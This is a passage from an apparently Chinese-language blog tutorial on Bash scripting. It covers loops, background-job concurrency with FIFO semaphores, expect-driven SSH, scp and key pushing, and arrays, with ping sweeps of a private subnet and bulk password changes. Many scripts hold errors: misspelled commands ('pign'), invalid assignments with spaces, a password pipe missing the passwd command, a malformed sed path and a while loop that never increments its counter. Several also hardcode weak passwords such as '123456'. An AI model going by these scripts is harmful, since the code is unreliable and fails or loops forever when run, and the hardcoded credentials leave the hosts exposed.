class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目前：通的放一个文件，不通的放一个文件</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(cat ip.txt)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line">ssh <span class="variable">$ip</span> <span class="built_in">echo</span> <span class="string">"123"</span> |passwd --stdin <span class="variable">$user</span>   <span class="comment"># 采用的公钥认证</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt;success_`date + %F`.txt</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt;failed_`date + %F`.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt;failed_`date + %F`.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"end!"</span></span><br></pre></td></tr></table></figure><p>例子6：批量修改主机ssh设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="variable">$ip</span> <span class="string">"sed -ri '/~#UseDNS/cUseDNS0 no' /etc/ssd/sshd_config"</span>   <span class="comment"># 搜索并替换(c)</span></span><br></pre></td></tr></table></figure><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><blockquote><p>逐行读取文件的时候，while有优势</p><p>不用像for循环那样担心每一行的空格空行</p><p>所以：读取一个文件中逐行处理，while比for好用</p></blockquote><p>例子1：创建用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以后，读取一个文件中逐行处理，while比for好用</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line:</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 判断用户数是否输入参数</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;#line&#125;</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">user = `<span class="built_in">echo</span> <span class="variable">$line</span>|awk <span class="string">'&#123;printf $1&#125;'</span>`</span><br><span class="line">pass = `<span class="built_in">echo</span> <span class="variable">$line</span>|awk <span class="string">'&#123;printf $2&#125;'</span>`</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$pass</span>"</span> | --stdin <span class="variable">$user</span> &amp;&gt;/dev/null    <span class="comment"># 将密码作为标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="variable">$1</span> <span class="comment"># 可以换成位置变量,   从文件里面读取用户名(read不用-p了)</span></span><br><span class="line"><span class="comment"># done &lt; user.tx  #</span></span><br></pre></td></tr></table></figure><p>例子2：while实现连接测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只要ping通就一直ping（【条件为true时候一直执行循环】）</span></span><br><span class="line">ip=192.168.0.5</span><br><span class="line"><span class="keyword">while</span> ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null; <span class="keyword">do</span></span><br><span class="line">sleep 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down!"</span></span><br></pre></td></tr></table></figure><p>例子3：until 实现连接测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip=192.168.0.5</span><br><span class="line">until ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null; <span class="keyword">do</span></span><br><span class="line">sleep 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up!"</span></span><br></pre></td></tr></table></figure><ul><li>while 适合写主机下线</li><li>until 适合写主机上线</li></ul><h5 id="until循环"><a href="#until循环" class="headerlink" title="until循环"></a>until循环</h5><p>形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当条件测试为false时候执行循环体</span></span><br><span class="line">until 条件测试</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">循环体</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>例子1：until实现数值运算</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># i=1</span></span><br><span class="line">until [ <span class="variable">$i</span> -gt 100 ]    <span class="comment"># &gt;100</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> sum+=<span class="variable">$i</span></span><br><span class="line"><span class="built_in">let</span> i++</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"sum: <span class="variable">$sum</span>"</span></span><br></pre></td></tr></table></figure><p>例子2：while实现数值运算</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数值运算：let</span></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -le 100 ]   <span class="comment"># &lt;=100</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> sum+=<span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"sum: <span class="variable">$sum</span>"</span></span><br></pre></td></tr></table></figure><h5 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h5><p> 并发  —&gt; 多进程  </p><p>之前写的传统并发的方式，多进程（返回是时间是乱序的）  </p><p> <strong>缺点：</strong>有些并发数量太多，会报错</p><p><strong>格式:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">ip=192.168.0.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up."</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"执行结束..."</span></span><br></pre></td></tr></table></figure><p><strong>控制并发的数量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 1). FD(File Descriptors)文件描述符 或 文件句柄 </span></span><br><span class="line"><span class="comment"># 进程使用文件描述符来管理打开的文件（位置： /proc/进程id/fd/）</span></span><br><span class="line"><span class="comment"># $$是当前进程</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 6&lt;&gt; /file1    <span class="comment"># 1.手动指定描述符来 打开文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"111"</span> &gt;&gt; /proc/$$/fd/6    <span class="comment"># 2.写入到了file1</span></span><br><span class="line"><span class="comment"># 3.删除file1</span></span><br><span class="line"><span class="comment"># 4.然后查看文件句柄:</span></span><br><span class="line">ll /proc/$$/fd</span><br><span class="line"><span class="comment"># 会发现6显示删除状态</span></span><br><span class="line"><span class="comment">## 5.把6这个文件拷贝出来变成file1,就又回来了（如果文件句柄没有删除或关闭。就算原文件被删除了，句柄依然在）</span></span><br><span class="line">ls of <span class="comment"># 6.列出打开的文件</span></span><br><span class="line"><span class="built_in">exec</span> 6&lt;&amp;-    <span class="comment"># 7.释放文件的句柄 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2). 管道</span></span><br><span class="line"><span class="comment">## 匿名管道(一个终端内使用) |</span></span><br><span class="line"><span class="comment">## 跨终端使用   mkfifo</span></span><br><span class="line">mkfifo  /tmp/fifo1   <span class="comment"># 创建</span></span><br><span class="line">ll /dev &gt; /tmp/fifo1 <span class="comment"># 把dev重定向到管道中，另一个终端就可以用了</span></span><br><span class="line"><span class="comment"># 另一个终端使用： </span></span><br><span class="line">grep <span class="string">'sda'</span> /tmp/fifo1</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">thread=5</span><br><span class="line">tmp_fifofile=/tmp/$$.fifo</span><br><span class="line"></span><br><span class="line">mkfifo <span class="variable">$tmp_fifofile</span></span><br><span class="line"><span class="built_in">exec</span> 8&lt;&gt; <span class="variable">$tmp_fifofile</span></span><br><span class="line">rm <span class="variable">$tmp_fifofile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="variable">$thread</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> &gt;&amp;8   <span class="comment"># 操作的是文件描述符（）</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -u 8    <span class="comment"># -u 是读取文件描述符内容（逐行）</span></span><br><span class="line">&#123;</span><br><span class="line">ip=192.168.0.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up."</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> &gt;&amp;8  <span class="comment"># 有借有还（借一个还一个，不能让文件描述符里面空）</span></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"执行结束.  .."</span></span><br><span class="line"><span class="comment"># 执行结果是5个5个出来的（因为定义的进程是5个）</span></span><br></pre></td></tr></table></figure><h5 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h5><p> expect —-&gt; 不是shell，是一个新的语言</p><p>解决交互的繁琐操作</p><p>安装：<code>apt install expect</code></p><p>expect实现批量远程命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果for while，需要一步步的交互(比较麻烦)，但是可以使用公钥认证(ssh-keygen,ssh-copy-id)</span></span><br><span class="line"><span class="comment">#第一步，实现了公钥认证</span></span><br><span class="line"><span class="comment"># ps:如果登录的新的机器与之前的指纹不一样，先删除本地保存的信息</span></span><br><span class="line"><span class="comment"># expect打前站，先把公钥推过去，后面再用别的实现</span></span><br></pre></td></tr></table></figure><p>ssh初级例子1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"><span class="built_in">set</span> ip 192.168.0.1</span><br><span class="line"><span class="built_in">set</span> user root</span><br><span class="line"><span class="built_in">set</span> passwd 123456</span><br><span class="line"><span class="built_in">set</span> timeout 5</span><br><span class="line"></span><br><span class="line">spawn ssh <span class="variable">$user</span>@<span class="variable">$ip</span></span><br><span class="line">expect &#123;   <span class="comment">#就是把接下来要出现的字符串等提前写好</span></span><br><span class="line"><span class="string">"yes/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;  <span class="comment"># 当出现什么，怎么处理(没出现就继续)</span></span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">interact  <span class="comment">#交互停在对方那边不退出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行脚本: expect test.sh</span></span><br></pre></td></tr></table></figure><p>ssh初级例子2(升级版)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"><span class="built_in">set</span> ip [lindex <span class="variable">$argv</span> 0]   <span class="comment"># 第一个位置参数(与shell的不通)</span></span><br><span class="line"><span class="built_in">set</span> user [lindex <span class="variable">$argv</span> 1]</span><br><span class="line"><span class="built_in">set</span> passwd 123456</span><br><span class="line"><span class="built_in">set</span> timeout 5</span><br><span class="line"></span><br><span class="line">spawn ssh <span class="variable">$user</span>@<span class="variable">$ip</span></span><br><span class="line">expect &#123;   <span class="comment">#就是把接下来要出现的字符串等提前写好</span></span><br><span class="line"><span class="string">"yes/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;  <span class="comment"># 当出现什么，怎么处理(没出现就继续)</span></span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#interact  # 交互停在对方那边不退出来</span></span><br><span class="line"><span class="comment"># 干点别的事情</span></span><br><span class="line">expect <span class="string">"#"</span>            <span class="comment"># 不用大括号也可以</span></span><br><span class="line"><span class="comment">#send "useradd xps\r"</span></span><br><span class="line">send <span class="string">"pwd\r"</span></span><br><span class="line">send <span class="string">"exit\r"</span></span><br><span class="line">expect eof  <span class="comment"># 结束expect</span></span><br></pre></td></tr></table></figure><p>例子3：scp传递文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######## 升级版</span></span><br><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"><span class="built_in">set</span> ip [lindex <span class="variable">$argv</span> 0]   <span class="comment"># 第一个位置参数(与shell的不通)</span></span><br><span class="line"><span class="built_in">set</span> user [lindex <span class="variable">$argv</span> 1]</span><br><span class="line"><span class="built_in">set</span> passwd 123456</span><br><span class="line"><span class="built_in">set</span> timeout 5</span><br><span class="line"></span><br><span class="line">spawn scp -r /etc/xxx <span class="variable">$user</span>@<span class="variable">$ip</span>:/tmp</span><br><span class="line"></span><br><span class="line">expect &#123;   <span class="comment">#就是把接下来要出现的字符串等提前写好</span></span><br><span class="line"><span class="string">"yes/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;  <span class="comment"># 当出现什么，怎么处理(没出现就继续)</span></span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">expect eof  <span class="comment"># 结束expect</span></span><br></pre></td></tr></table></figure><p>例子4： 推公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell与expect一起用</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">&gt;ip.txt</span><br><span class="line">passwd=123</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试expect有没有装(以centos为例)</span></span><br><span class="line">rpm -q expect &amp;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0  ];<span class="keyword">then</span></span><br><span class="line">yum -y install expect</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否有公钥</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f ~/.ssh/id_rsa ];<span class="keyword">then</span></span><br><span class="line">ssh-keygen -P <span class="string">"123"</span> -f ~/.ssh/id_rsa <span class="comment"># 指定公钥的密码和位置</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;2..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">ip=192.168.0.<span class="variable">$i</span></span><br><span class="line">pign -c1 -W1 <span class="variable">$ip</span> &amp;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt; ip.txt</span><br><span class="line"><span class="comment"># 开始expect</span></span><br><span class="line">/usr/bin/expect &lt;&lt;-EOF</span><br><span class="line"><span class="built_in">set</span> timeout 10</span><br><span class="line">spawn ssh-copy-id <span class="variable">$ip</span>      <span class="comment"># 推送公钥。 前面必须都是tab，不能有空格（:set list 查看是tab还是空格）</span></span><br><span class="line">expect &#123;</span><br><span class="line"><span class="string">"yse/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;</span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">expect eof</span><br><span class="line">EOF</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish..."</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上一个例子, 已经实现了公钥认证，后面的操作就可以使用shell了，基本不用expect了</span></span><br><span class="line"><span class="comment"># 重启之后查看机器的ip，直接用get_ip.sh脚本（就不用了一个一个去看了）</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">&gt;ping.txt</span><br><span class="line"><span class="comment"># &#123;2..254&#125;  集合，  另一个序列: seq `2 254`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;2..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = 192.168.111.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null  </span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> | tee -a ping.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;    】</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span>    </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish !!!"</span></span><br></pre></td></tr></table></figure><h4 id="五-数组"><a href="#五-数组" class="headerlink" title="五.数组"></a>五.数组</h4><p>没有多维数组这个概念</p><p><strong>定义</strong></p><p>1.普通数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通数组：只能使用整数作为数组索引</span></span><br><span class="line">books=(linux shell awk docker)</span><br><span class="line">books=(linux shell awk [20]=docker)  <span class="comment"># 索引20为docker</span></span><br><span class="line"><span class="comment"># 从文件赋值</span></span><br><span class="line">books2=(`cat /etc/passwd`)</span><br><span class="line">books=(`ls /etc/`)</span><br><span class="line"><span class="comment"># 中间值可以跳过</span></span><br></pre></td></tr></table></figure><p>2.关联数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关联数组：可以使用字符串作为数组索引（相当于字典）</span></span><br><span class="line"><span class="built_in">declare</span> -A info <span class="comment"># 先声明是关联数组</span></span><br><span class="line">info ([name]=xps [sex]=male [age]=20 [skill]=security)  <span class="comment"># 赋值</span></span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;books[3]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[name]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有的数组</span></span><br><span class="line"><span class="built_in">declare</span> -a</span><br><span class="line"><span class="comment"># 查看所有的关联数组</span></span><br><span class="line"><span class="built_in">declare</span> -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数组元素的索引号</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[@:1]&#125;</span>   <span class="comment"># 从数组下标1开始</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[@:1:2]&#125;</span>   <span class="comment"># 从数组下标1开始，访问两个元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有的索引key</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;!info[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计元素个数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#info[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组中所有元数（等同于： $&#123;info[*]&#125;     ）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[@]&#125;</span></span><br></pre></td></tr></table></figure><p><strong>遍历</strong></p><p>1.按照个数遍历</p><p>2.按照索引遍历</p><p>例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td 